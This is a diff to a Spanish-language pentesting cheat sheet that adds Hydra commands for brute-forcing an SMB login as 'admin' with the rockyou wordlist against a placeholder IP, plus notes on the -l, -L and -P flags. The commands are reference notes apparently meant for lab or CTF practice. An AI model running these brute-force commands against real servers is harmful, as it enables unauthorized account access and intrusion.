@@ -67,8 +67,12 @@ Esto se usa en el panel del admin de WordPress.
 
 ## Hydra fuerza bruta SMB
 ```python 
+❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
+❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
+
 ❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB
 
 	# L = Ruta o archivo que contiene los usuarios
 	# P = Ruta o archivo que contiene las passwd
+	# l = Un usuario en especifico
 ```
